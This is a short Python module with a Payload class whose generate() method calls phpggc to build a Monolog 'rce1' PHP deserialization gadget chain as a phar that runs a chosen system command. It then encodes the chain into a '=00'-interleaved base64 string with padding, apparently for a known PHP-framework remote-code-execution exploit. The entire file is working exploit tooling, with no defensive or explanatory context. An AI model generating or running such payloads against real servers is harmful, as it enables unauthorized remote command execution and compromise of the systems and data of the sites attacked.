import subprocess
from subprocess import Popen
class Payload:

    @staticmethod
    def generate(cmd = '', padding = 0):
        if '/' in cmd:
            cmd = cmd.replace('/', '\/')
            cmd = cmd.replace('\'', '\\\'')
        shell = Popen(r"""php -d'phar.readonly=0' ./phpggc/phpggc monolog/rce1 system '%s' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g'""" % (cmd), shell=True, stdout=subprocess.PIPE)
        payload = ''
        with shell.stdout as text:
            payload = str(text.read())
            payload = payload.replace('==', '=3D=')
            for _ in range(padding):
                payload += '=00'
        return payload